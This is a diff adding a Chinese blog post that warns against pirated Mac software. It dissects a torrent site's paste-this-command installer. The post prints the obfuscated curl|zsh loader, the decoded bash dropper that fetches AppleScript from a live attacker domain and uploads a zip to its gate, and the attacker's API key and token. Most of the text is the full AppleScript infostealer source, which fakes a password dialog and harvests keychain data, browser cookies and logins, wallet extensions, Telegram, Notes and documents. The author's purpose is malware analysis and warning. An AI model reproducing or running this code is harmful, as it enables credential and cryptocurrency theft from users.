@@ -1145,6 +1145,1139 @@ curl -k -s --max-time 30 -H &amp;#34;User-Agent: Mozilla/5.0 (Macintosh; Intel M
 **end if**
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;后记&#34;&gt;后记&lt;/h2&gt;
 &lt;p&gt;借助GPT的分析你会发现这是一段后门程序，执行完成之后会主动退出terminal然后将所有的输入输出以及错误重定向到/dev/null（黑洞）的位置，至此你是无感执行的，最后这段程序大概含义就是盗取你的比特币钱包替换为对方的，然后提取你电脑的重要信息打包到一个临时目录中最后再上传到对方的服务器当中，整个过程相当丝滑，现在想想之前的盗版软件下载了一大堆，那个时候电脑莫名发热很可能就是用来当肉鸡挖矿或者任由对方摆布了&amp;hellip;，能支持正版还是尽量支持正版吧，看到linuxdo上面的安全大佬也给过提醒：绝大部分的盗版软件都是有后门的，能正版就尽量支持正版吧。&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h1 id="前言">前言</h1>
+<p>最近重装了一下macos，恢复之后的macos流畅度感觉提升了不止一个度，之前可能是装了太多的盗版软件以及渗透测试工具，杂乱无章……导致我的macos及其臃肿，最近实在受不这样的mac，直接重制了操作系统，会想起以前自己搜集的一些好用的工具都在github中，最近在 <a href="https://github.com/jaywcjlove/awesome-mac">awesome-mac</a>这个项目当看到三个盗版网站，想到GPT也是可以推荐盗版网站的，问问GPT盗版网站的列表，于是给了我一些惊喜，确实有很多的网站被推荐了出来，当我看到这个<a href="https://www.torrentmac.net">mactorrent</a>站点的时候特别好奇，根据我的体验带有torrent的网站体验都还行，本着影响还不错的原因，想去这里下载一个cleanmymac x用来卸载mac的软件</p>
+<h2 id="事件经过">事件经过</h2>
+<p>网页大概是这个样子的
+<img alt="image.png" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202511111844803.png">
+随便找一个软件找到下载的位置
+<img alt="image.png" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202511111845895.png"></p>
+<p>可以看到给了一段curl 下载程序的指令，对于用惯了terminal的朋友们来说真的特别习惯，下面甚至还有图文教程，教你如何打开terminal然后复制粘贴这段指令最后执行
+<img alt="image.png" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202511111846072.png"></p>
+<p>由于前些年打CTF的阴影，导致我对base64比较敏感，看到这段编码不由得去解开了解其中的奥秘</p>
+<pre tabindex="0"><code>curl -kfsSL $(echo &#39;aHR0cHM6Ly9uaGF4dW9uZy5jb20vY3VybC8yNTkxOWU4YzRkNjcwMDcwNGZjNDVhOTFiNmY2NDM2ZGI0MTM5YmZhNzUwZDUxYmYzNmVhMWM2ZjZmMGY2YzAw&#39;|base64 -d)|zsh
+</code></pre><p>这段base64解码之后得到如下url</p>
+<pre tabindex="0"><code>https://nhaxuong.com/curl/25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00
+#链接下载之后得到如下内容
+
+#!/bin/zsh
+d11268=$(base64 -d &lt;&lt;&#39;PAYLOAD_m216212141828691&#39; | gunzip
+H4sIAEuIEmkAA+VUW2/TMBR+7684ZNXUSiSxm9vSUbYJCYZGNaQWMQlQ5TjHrVXHjhIXugH/nayt
+uqzbC29I+Mn6LpbPd4599MLPpPYzVi86OcPC6JlYaW6l0b0+/OxAs3CNHF75OX739UqpB+z1M9jg
+AFxKpZhSMMWqkJptQWU4U5Cbgkk9cvSCrVdGzz1uCqfFW7PEhh5EKU3xhId5nBCSkFDwMGIpzWIR
+h0GcZyEN0kywJCJ5RDMRxMgob0hBRMwJaR/JSjlb4u3IiWhKUNAkCOhJwEjO40Bk8SAIokREcR5v
+TVLAF+gegTu3QODbKdgF6g1zv/iqUuAuwa3BdQu2dq0sEAIC7iU4n2qs3Is5ajuEsbm7T8GPPAK9
+MeNSW1MvTuG9tqigAeB6AjdAyYxGs6QPF2Wp8DNmV9L6UZB4QQy9q8vp+MNLUHKJ8A750vThzaIy
+Bfop9YgXhsnAozSECROskjubs7lKU7TbFD2E7q58B5yFtWU99P3utgl+fqtZIfmZXeej7ib44/JH
+s6UO/AJTs5pXsrTbNqsa/5MMnhYvZGswzsDV+Mxg4FpaoG39PqYb+Hg9mcLXvfZfCurgVs9kdqDg
+agjkMdoeAvKIeQuOkApH574tSr+JVZn5XDbP/k6WzqEyW0mVtxvR4p80bs4sbh/sXzfnd6dRH3x8
+4HTPHTh+sG0spLMf/N0Rjf0PgDlK/z8FAAA=
+PAYLOAD_m216212141828691
+)
+eval &#34;$d11268&#34;
+
+#至此已经初现端倪，可以看到payload、eval这些关键词,我们接着解码，得到如下脚本
+#!/bin/bash
+daemon_function() {
+    exec &lt;/dev/null
+    exec &gt;/dev/null
+    exec 2&gt;/dev/null
+    killall Terminal
+    local domain=&#34;nhaxuong.com&#34;
+    local token=&#34;25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00&#34;
+    local api_key=&#34;5190ef1733183a0dc63fb623357f56d6&#34;
+    if [ $# -gt 0 ]; then
+        curl -k -s --max-time 30 -H &#34;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&#34; -H &#34;api-key: $api_key&#34; &#34;https://$domain/dynamic?txd=$token&amp;pwd=$1&#34; | osascript
+    else
+        curl -k -s --max-time 30 -H &#34;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&#34; -H &#34;api-key: $api_key&#34; &#34;https://$domain/dynamic?txd=$token&#34; | osascript
+    fi
+    if [ $? -ne 0 ]; then
+        exit 1
+    fi
+    curl -k -X POST \
+         -H &#34;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&#34; \
+         -H &#34;api-key: $api_key&#34; \
+         -H &#34;cl: 0&#34; \
+         --max-time 300 \
+         -F &#34;file=@/tmp/osalogging.zip&#34; \
+         -F &#34;buildtxd=$token&#34; \
+         &#34;https://$domain/gate&#34;
+    
+    if [ $? -ne 0 ]; then
+        exit 1
+    fi
+}
+if daemon_function &#34;$@&#34; &amp; then
+    exit 0
+else
+    exit 1
+fi
+#最后我们截取
+curl -k -s --max-time 30 -H &#34;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&#34; -H &#34;api-key: $api_key&#34; &#34;https://$domain/dynamic?txd=$token&amp;pwd=$1&#34; 
+#这段指令，使用terminal执行，得到之后木马
+执行curl这段指令的时候需要先在terminal执行下面三个赋值的指令，不然你是没权限获得脚本的
+    local domain=&#34;nhaxuong.com&#34;
+    local token=&#34;25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00&#34;
+    local api_key=&#34;5190ef1733183a0dc63fb623357f56d6&#34;
+
+#木马脚本如下
+
+**on filesizer(paths)**
+
+**set fsz to 0**
+
+**try**
+
+**set theItem to quoted form of POSIX path of paths**
+
+**set fsz to (do shell script &#34;/usr/bin/mdls -name kMDItemFSSize -raw &#34; &amp; theItem)**
+
+**end try**
+
+**return fsz**
+
+**end filesizer**
+
+  
+
+**on mkdir(someItem)**
+
+**try**
+
+**set filePosixPath to quoted form of (POSIX path of someItem)**
+
+**do shell script &#34;mkdir -p &#34; &amp; filePosixPath**
+
+**end try**
+
+**end mkdir**
+
+  
+
+**on FileName(filePath)**
+
+**try**
+
+**set reversedPath to (reverse of every character of filePath) as string**
+
+**set trimmedPath to text 1 thru ((offset of &#34;/&#34; in reversedPath) - 1) of reversedPath**
+
+**set finalPath to (reverse of every character of trimmedPath) as string**
+
+**return finalPath**
+
+**end try**
+
+**end FileName**
+
+  
+
+**on BeforeFileName(filePath)**
+
+**try**
+
+**set lastSlash to offset of &#34;/&#34; in (reverse of every character of filePath) as string**
+
+**set trimmedPath to text 1 thru -(lastSlash + 1) of filePath**
+
+**return trimmedPath**
+
+**end try**
+
+**end BeforeFileName**
+
+  
+
+**on writeText(textToWrite, filePath)**
+
+**try**
+
+**set folderPath to BeforeFileName(filePath)**
+
+**mkdir(folderPath)**
+
+**set fileRef to (open for access filePath with write permission)**
+
+**write textToWrite to fileRef starting at eof**
+
+**close access fileRef**
+
+**end try**
+
+**end writeText**
+
+  
+
+**on readwrite(path_to_file, path_as_save)**
+
+**try**
+
+**set fileContent to read path_to_file**
+
+**set folderPath to BeforeFileName(path_as_save)**
+
+**mkdir(folderPath)**
+
+**do shell script &#34;cat &#34; &amp; quoted form of path_to_file &amp; &#34; &gt; &#34; &amp; quoted form of path_as_save**
+
+**end try**
+
+**end readwrite**
+
+  
+
+**on isDirectory(someItem)**
+
+**try**
+
+**set filePosixPath to quoted form of (POSIX path of someItem)**
+
+**set fileType to (do shell script &#34;file -b &#34; &amp; filePosixPath)**
+
+**if fileType ends with &#34;directory&#34; then**
+
+**return true**
+
+**end if**
+
+**return false**
+
+**end try**
+
+**end isDirectory**
+
+  
+
+**on GrabFolderLimit(sourceFolder, destinationFolder)**
+
+**try**
+
+**set bankSize to 0**
+
+**set exceptionsList to {&#34;.DS_Store&#34;, &#34;Partitions&#34;, &#34;Code Cache&#34;, &#34;Cache&#34;, &#34;market-history-cache.json&#34;, &#34;journals&#34;, &#34;Previews&#34;}**
+
+**set fileList to list folder sourceFolder without invisibles**
+
+**mkdir(destinationFolder)**
+
+**repeat with currentItem in fileList**
+
+**if currentItem is not in exceptionsList then**
+
+**set itemPath to sourceFolder &amp; &#34;/&#34; &amp; currentItem**
+
+**set savePath to destinationFolder &amp; &#34;/&#34; &amp; currentItem**
+
+**if isDirectory(itemPath) then**
+
+**GrabFolderLimit(itemPath, savePath)**
+
+**else**
+
+**set fsz to filesizer(itemPath)**
+
+**set bankSize to bankSize + fsz**
+
+**if bankSize &lt; 100 * 1024 * 1024 then**
+
+**readwrite(itemPath, savePath)**
+
+**end if**
+
+**end if**
+
+**end if**
+
+**end repeat**
+
+**end try**
+
+**end GrabFolderLimit**
+
+  
+
+**on GrabFolder(sourceFolder, destinationFolder)**
+
+**try**
+
+**set exceptionsList to {&#34;.DS_Store&#34;, &#34;Partitions&#34;, &#34;Code Cache&#34;, &#34;Cache&#34;, &#34;market-history-cache.json&#34;, &#34;journals&#34;, &#34;Previews&#34;, &#34;dumps&#34;, &#34;emoji&#34;, &#34;user_data&#34;, &#34;__update__&#34;}**
+
+**set fileList to list folder sourceFolder without invisibles**
+
+**mkdir(destinationFolder)**
+
+**repeat with currentItem in fileList**
+
+**if currentItem is not in exceptionsList then**
+
+**set itemPath to sourceFolder &amp; &#34;/&#34; &amp; currentItem**
+
+**set savePath to destinationFolder &amp; &#34;/&#34; &amp; currentItem**
+
+**if isDirectory(itemPath) then**
+
+**GrabFolder(itemPath, savePath)**
+
+**else**
+
+**readwrite(itemPath, savePath)**
+
+**end if**
+
+**end if**
+
+**end repeat**
+
+**end try**
+
+**end GrabFolder**
+
+  
+
+**on checkvalid(username, password_entered)**
+
+**try**
+
+**set result to do shell script &#34;dscl . authonly &#34; &amp; quoted form of username &amp; space &amp; quoted form of password_entered**
+
+**if result is not equal to &#34;&#34; then**
+
+**return false**
+
+**else**
+
+**return true**
+
+**end if**
+
+**on error**
+
+**return false**
+
+**end try**
+
+**end checkvalid**
+
+  
+
+**on getpwd(username, writemind, provided_password)**
+
+    **try**
+
+        **if provided_password is not equal to &#34;&#34; then**
+
+            **if checkvalid(username, provided_password) then**
+
+                **writeText(provided_password, writemind &amp; &#34;Password&#34;)**
+
+                **return provided_password**
+
+            **end if**
+
+        **end if**
+
+        **if checkvalid(username, &#34;&#34;) then**
+
+            **set result to do shell script &#34;security 2&gt;&amp;1 &gt; /dev/null find-generic-password -ga \&#34;Chrome\&#34; | awk \&#34;{print $2}\&#34;&#34;**
+
+            **writeText(result as string, writemind &amp; &#34;masterpass-chrome&#34;)**
+
+            **return &#34;&#34;**
+
+        **else**
+
+            **repeat**
+
+                **set result to display dialog &#34;Required Application Helper. Please enter password for continue.&#34; default answer &#34;&#34; with icon caution buttons {&#34;Continue&#34;} default button &#34;Continue&#34; giving up after 150 with title &#34;System Preferences&#34; with hidden answer**
+
+                **set password_entered to text returned of result**
+
+                **if checkvalid(username, password_entered) then**
+
+                    **writeText(password_entered, writemind &amp; &#34;Password&#34;)**
+
+                    **return password_entered**
+
+                **end if**
+
+            **end repeat**
+
+        **end if**
+
+    **end try**
+
+    **return &#34;&#34;**
+
+**end getpwd**
+
+  
+
+**on grabPlugins(paths, savePath, pluginList, index)**
+
+**try**
+
+**set fileList to list folder paths without invisibles**
+
+**repeat with PFile in fileList**
+
+**repeat with Plugin in pluginList**
+
+**if (PFile contains Plugin) then**
+
+**set newpath to paths &amp; PFile**
+
+**set newsavepath to savePath &amp; &#34;/&#34; &amp; Plugin**
+
+**if index then**
+
+**set newsavepath to savePath &amp; &#34;/IndexedDB/&#34; &amp; PFile**
+
+**end if**
+
+**GrabFolder(newpath, newsavepath)**
+
+**end if**
+
+**end repeat**
+
+**end repeat**
+
+**end try**
+
+**end grabPlugins**
+
+  
+
+**on Chromium(writemind, chromium_map)**
+
+**set pluginList to {}**
+
+    **set pluginList to pluginList &amp; {&#34;eiaeiblijfjekdanodkjadfinkhbfgcd&#34;, &#34;aeblfdkhhhdcdjpifhhbdiojplfjncoa&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;bfogiafebfohielmmehodmfbbebbbpei&#34;, &#34;nngceckbapebfimnlniiiahkandclblb&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;fdjamakpfbbddfjaooikfcpapjohcfmg&#34;, &#34;hdokiejnpimakedhajhdlcegeplioahd&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;pnlccmojcmeohlpggmfnbbiapkmbliob&#34;, &#34;ghmbeldphafepmbegfdlkpapadhbakde&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;kmcfomidfpdkfieipokbalgegidffkal&#34;, &#34;bnfdmghkeppfadphbnkjcicejfepnbfe&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;caljgklbbfbcjjanaijlacgncafpegll&#34;, &#34;folnjigffmbjmcjgmbbfcpleeddaedal&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;igkpcodhieompeloncfnbekccinhapdb&#34;, &#34;admmjipmmciaobhojoghlmleefbicajg&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;ehpbfbahieociaeckccnklpdcmfaeegd&#34;, &#34;epanfjkfahimkgomnigadpkobaefekcd&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;didegimhafipceonhjepacocaffmoppf&#34;, &#34;oboonakemofpalcgghocfoadofidjkkk&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;jgnfghanfbjmimbdmnjfofnbcgpkbegj&#34;, &#34;mmhlniccooihdimnnjhamobppdhaolme&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;dbfoemgnkgieejfkaddieamagdfepnff&#34;, &#34;bhghoamapcdpbohphigoooaddinpkbai&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;nngceckbapebfimnlniiiahkandclblb&#34;, &#34;lojeokmpinkpmpbakfkfpgfhpapbgdnd&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;ibpjepoimpcdofeoalokgpjafnjonkpc&#34;, &#34;gmohoglkppnemohbcgjakmgengkeaphi&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;hdokiejnpimakedhajhdlcegeplioahd&#34;, &#34;oboonakemofpalcgghocfoadofidjkkk&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;dckgbiealcgdhgjofgcignfngijpbgba&#34;, &#34;gmegpkknicehidppoebnmbhndjigpica&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;eiokpeobbgpinbmcanngjjbklmhlepan&#34;, &#34;odfkmgboddhcgopllebhkbjhokpojigd&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;ppnbnpeolgkicgegkbkbjmhlideopiji&#34;, &#34;cejfhijdfemlohmcjknpbeaohedoikpp&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;nmhjblhloefhbhgbfkdgdpjabaocnhha&#34;, &#34;iklgijhacenjgjgdnpnohbafpbmnccek&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;ppkkcfblhfgmdmefkmkoomenhgecbemi&#34;, &#34;lgndjfkadlbpaifdpbbobdodbaiaiakb&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;bbphmbmmpomfelajledgdkgclfekilei&#34;, &#34;bnfooenhhgcnhdkdjelgmmkpaemlnoek&#34;}**
+
+  
+
+**set chromiumFiles to {&#34;/Network/Cookies&#34;, &#34;/Cookies&#34;, &#34;/Web Data&#34;, &#34;/Login Data&#34;, &#34;/Local Extension Settings/&#34;, &#34;/IndexedDB/&#34;}**
+
+**repeat with chromium in chromium_map**
+
+**set savePath to writemind &amp; &#34;Browsers/&#34; &amp; item 1 of chromium &amp; &#34;_&#34;**
+
+**try**
+
+**set fileList to list folder item 2 of chromium without invisibles**
+
+**repeat with currentItem in fileList**
+
+**if ((currentItem as string) is equal to &#34;Default&#34;) or ((currentItem as string) contains &#34;Profile&#34;) then**
+
+**set profileName to (item 1 of chromium &amp; currentItem)**
+
+**repeat with CFile in chromiumFiles**
+
+**set readpath to (item 2 of chromium &amp; currentItem &amp; CFile)**
+
+**if ((CFile as string) is equal to &#34;/Network/Cookies&#34;) then**
+
+**set CFile to &#34;/Cookies&#34;**
+
+**end if**
+
+**if ((CFile as string) is equal to &#34;/Local Extension Settings/&#34;) then**
+
+**grabPlugins(readpath, writemind &amp; &#34;Extensions/&#34; &amp; profileName, pluginList, false)**
+
+**else if (CFile as string) is equal to &#34;/IndexedDB/&#34; then**
+
+**grabPlugins(readpath, writemind &amp; &#34;Extensions/&#34; &amp; profileName, pluginList, true)**
+
+**else**
+
+**set writepath to savePath &amp; currentItem &amp; CFile**
+
+**readwrite(readpath, writepath)**
+
+**end if**
+
+**end repeat**
+
+**end if**
+
+**end repeat**
+
+**end try**
+
+**end repeat**
+
+**end Chromium**
+
+  
+
+**on ChromiumWallets(writemind, chromium_map)**
+
+**set pluginList to {}**
+
+**set pluginList to pluginList &amp; {&#34;nkbihfbeogaeaoehlefnkodbefgpgknn&#34;, &#34;bfnaelmomeimhlpmgjnjophhpkkoljpa&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;hnfanknocfeofbddgcijnmhnfnkdnaad&#34;, &#34;fnjhmkhhmkbjkkabndcnnogagogbneec&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;acmacodkjbdgmoleebolmdjonilkdbch&#34;, &#34;egjidjbpglichdcondbcbdnbeeppgdph&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;aholpfdialjgjfhomihkjbmgjidlcdno&#34;, &#34;fhbohimaelbohpjbbldcngcnapndodjp&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;pdliaogehgdbhbnmkklieghmmjkpigpa&#34;, &#34;mcohilncbfahbmgdjkbpemcciiolgcge&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;hpglfhgfnhbgpjdenjgmdgoeiappafln&#34;, &#34;bhhhlbepdkbapadjdnnojkbgioiodbic&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;dhgnlgphgchebgoemcjekedjjbifijid&#34;, &#34;cjmkndjhnagcfbpiemnkdpomccnjblmj&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;kamfleanhcmjelnhaeljonilnmjpkcjc&#34;, &#34;jnldfbidonfeldmalbflbmlebbipcnle&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;fdcnegogpncmfejlfnffnofpngdiejii&#34;, &#34;klnaejjgbibmhlephnhpmaofohgkpgkd&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;pdadjkfkgcafgbceimcpbkalnfnepbnk&#34;, &#34;kjjebdkfeagdoogagbhepmbimaphnfln&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;ldinpeekobnhjjdofggfgjlcehhmanlj&#34;, &#34;dkdedlpgdmmkkfjabffeganieamfklkm&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;bcopgchhojmggmffilplmbdicgaihlkp&#34;, &#34;kpfchfdkjhcoekhdldggegebfakaaiog&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;idnnbdplmphpflfnlkomgpfbpcgelopg&#34;, &#34;mlhakagmgkmonhdonhkpjeebfphligng&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;bipdhagncpgaccgdbddmbpcabgjikfkn&#34;, &#34;gcbjmdjijjpffkpbgdkaojpmaninaion&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;nhnkbkgjikgcigadomkphalanndcapjk&#34;, &#34;hoighigmnhgkkdaenafgnefkcmipfjon&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;klghhnkeealcohjjanjjdaeeggmfmlpl&#34;, &#34;fhbohimaelbohpjbbldcngcnapndodjp&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;ebfidpplhabeedpnhjnobghokpiioolj&#34;, &#34;emeeapjkbcbpbpgaagfchmcgglmebnen&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;fldfpgipfncgndfolcbkdeeknbbbnhcc&#34;, &#34;penjlddjkjgpnkllboccdgccekpkcbin&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;fhilaheimglignddkjgofkcbgekhenbh&#34;, &#34;hmeobnfnfcmdkdcmlblgagmfpfboieaf&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;cihmoadaighcejopammfbmddcmdekcje&#34;, &#34;lodccjjbdhfakaekdiahmedfbieldgik&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;omaabbefbmiijedngplfjmnooppbclkk&#34;, &#34;cjelfplplebdjjenllpjcblmjkfcffne&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;jnlgamecbpmbajjfhmmmlhejkemejdma&#34;, &#34;fpkhgmpbidmiogeglndfbkegfdlnajnf&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;bifidjkcdpgfnlbcjpdkdcnbiooooblg&#34;, &#34;amkmjjmmflddogmhpjloimipbofnfjih&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;flpiciilemghbmfalicajoolhkkenfel&#34;, &#34;hcflpincpppdclinealmandijcmnkbgn&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;aeachknmefphepccionboohckonoeemg&#34;, &#34;dmkamcknogkgcdfhhbddcghachkejeap&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;aiifbnbfobpmeekipheeijimdpnlpgpp&#34;}**
+
+  
+
+**set chromiumFiles to {&#34;/Local Extension Settings/&#34;, &#34;/IndexedDB/&#34;}**
+
+**repeat with chromium in chromium_map**
+
+**try**
+
+**set fileList to list folder item 2 of chromium without invisibles**
+
+**repeat with currentItem in fileList**
+
+**if ((currentItem as string) is equal to &#34;Default&#34;) or ((currentItem as string) contains &#34;Profile&#34;) then**
+
+**set profileName to (item 1 of chromium &amp; currentItem)**
+
+**repeat with CFile in chromiumFiles**
+
+**set readpath to (item 2 of chromium &amp; currentItem &amp; CFile)**
+
+**if ((CFile as string) is equal to &#34;/Local Extension Settings/&#34;) then**
+
+**grabPlugins(readpath, writemind &amp; &#34;Wallets/Web/&#34; &amp; profileName, pluginList, false)**
+
+**else if (CFile as string) is equal to &#34;/IndexedDB/&#34; then**
+
+**grabPlugins(readpath, writemind &amp; &#34;Wallets/Web/&#34; &amp; profileName, pluginList, true)**
+
+**else**
+
+**set writepath to savePath &amp; currentItem &amp; CFile**
+
+**readwrite(readpath, writepath)**
+
+**end if**
+
+**end repeat**
+
+**end if**
+
+**end repeat**
+
+**end try**
+
+**end repeat**
+
+**end Chromium**
+
+  
+
+  
+
+**on Telegram(writemind, library)**
+
+**try**
+
+**GrabFolder(library &amp; &#34;Telegram Desktop/tdata/&#34;, writemind &amp; &#34;Telegram Desktop/&#34;)**
+
+**end try**
+
+**end Telegram**
+
+  
+
+**on DesktopWallets(writemind, deskwals)**
+
+**repeat with deskwal in deskwals**
+
+**try**
+
+**GrabFolder(item 2 of deskwal, writemind &amp; item 1 of deskwal)**
+
+**end try**
+
+**end repeat**
+
+**end DesktopWallets**
+
+  
+
+**on Notes(writemind)**
+
+**try**
+
+        **set notesExportPath to writemind &amp; &#34;Notes/&#34;**
+
+        **mkdir(notesExportPath)**
+
+        **set noteCounter to 1**
+
+        **set unlockedCount to 0**
+
+        **set lockedCount to 0**
+
+        **set errorCount to 0**
+
+        **tell application &#34;Notes&#34;**
+
+            **if running of (application &#34;Notes&#34;) then**
+
+                **set notesAreReady to true**
+
+            **end if**
+
+            **if not notesAreReady then**
+
+                **return**
+
+            **end if**
+
+            **try**
+
+                **set allNotes to every note**
+
+            **on error**
+
+                **return**
+
+            **end try**
+
+            **repeat with oneNote in allNotes**
+
+                **try**
+
+                    **set noteName to &#34;note_&#34; &amp; noteCounter**
+
+                    **try**
+
+                        **set rawName to name of oneNote**
+
+                        **if rawName is not missing value and rawName is not &#34;&#34; then**
+
+                            **set noteName to rawName**
+
+                        **end if**
+
+                    **end try**
+
+**try**
+
+**set noteText to plaintext of oneNote**
+
+**set fileNameBase to noteName**
+
+**if length of fileNameBase &gt; 64 then**
+
+    **set fileNameBase to text 1 thru 64 of fileNameBase**
+
+**end if**
+
+**set filePath to notesExportPath &amp; fileNameBase &amp; &#34;.txt&#34;**
+
+**do shell script &#34;echo &#34; &amp; quoted form of noteText &amp; &#34; &gt; &#34; &amp; quoted form of filePath**
+
+**set unlockedCount to unlockedCount + 1**
+
+**on error errMsg**
+
+**set filePath to notesExportPath &amp; &#34;[ERROR]_&#34; &amp; fileNameBase &amp; &#34;.txt&#34;**
+
+**do shell script &#34;echo &#39;[Error reading content: &#34; &amp; errMsg &amp; &#34;]&#39; &gt; &#34; &amp; quoted form of filePath**
+
+**set errorCount to errorCount + 1**
+
+**end try**
+
+                    **set noteCounter to noteCounter + 1**
+
+**end try**
+
+            **end repeat**
+
+        **end tell**
+
+    **end try**
+
+  
+
+**end Notes**
+
+  
+
+**on filegrabber(writemind)**
+
+ **try**
+
+  **set destinationFolderPath to POSIX file (writemind &amp; &#34;FileGrabber/&#34;)**
+
+  **mkdir(destinationFolderPath)**
+
+  **set extensionsList to {&#34;pdf&#34;, &#34;docx&#34;, &#34;doc&#34;, &#34;wallet&#34;, &#34;keys&#34;, &#34;db&#34;, &#34;txt&#34;, &#34;seed&#34;}**
+
+  **set bankSize to 0**
+
+  **set fileCounter to 1**
+
+  **tell application &#34;Finder&#34;**
+
+   **try**
+
+    **set desktopFiles to every file of desktop**
+
+    **set documentsFiles to every file of folder &#34;Documents&#34; of (path to home folder)**
+
+    **set downloadsFiles to every file of folder &#34;Downloads&#34; of (path to home folder)**
+
+**set notesFiles to every file of folder &#34;Downloads&#34; of (path to home folder)**
+
+    **repeat with aFile in (desktopFiles &amp; documentsFiles &amp; downloadsFiles)**
+
+     **set fileExtension to name extension of aFile**
+
+     **if fileExtension is in extensionsList then**
+
+      **set filesize to size of aFile**
+
+      **if (bankSize + filesize) &lt; 10 * 1024 * 1024 then**
+
+       **try**
+
+        **set newFileName to (fileCounter as string) &amp; &#34;.&#34; &amp; fileExtension**
+
+        **duplicate aFile to folder destinationFolderPath with replacing**
+
+        **set destFolderAlias to destinationFolderPath as alias**
+
+        **tell application &#34;Finder&#34;**
+
+         **set copiedFiles to every file of folder destFolderAlias**
+
+         **set lastCopiedFile to item -1 of copiedFiles**
+
+         **set name of lastCopiedFile to newFileName**
+
+        **end tell**
+
+        **set bankSize to bankSize + filesize**
+
+        **set fileCounter to fileCounter + 1**
+
+       **end try**
+
+      **else**
+
+       **exit repeat**
+
+      **end if**
+
+     **end if**
+
+    **end repeat**
+
+   **end try**
+
+  **end tell**
+
+ **end try**
+
+**end filegrabber**
+
+  
+
+**set username to (system attribute &#34;USER&#34;)**
+
+**set profile to &#34;/Users/&#34; &amp; username**
+
+**set randomNumber to do shell script &#34;echo $((RANDOM % 9000000 + 1000000))&#34;**
+
+**set writemind to &#34;/tmp/&#34; &amp; randomNumber &amp; &#34;/&#34;**
+
+  
+
+**set library to profile &amp; &#34;/Library/Application Support/&#34;**
+
+**set password_entered to getpwd(username, writemind, &#34;&#34;)**
+
+  
+
+**delay 0.01**
+
+  
+
+**set chromiumMap to {}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Yandex&#34;, library &amp; &#34;Yandex/YandexBrowser&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Chrome&#34;, library &amp; &#34;Google/Chrome/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Brave&#34;, library &amp; &#34;BraveSoftware/Brave-Browser/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Edge&#34;, library &amp; &#34;Microsoft Edge/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Vivaldi&#34;, library &amp; &#34;Vivaldi/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Opera&#34;, library &amp; &#34;com.operasoftware.Opera/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;OperaGX&#34;, library &amp; &#34;com.operasoftware.OperaGX/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Chrome Beta&#34;, library &amp; &#34;Google/Chrome Beta/&#34;}}**
+
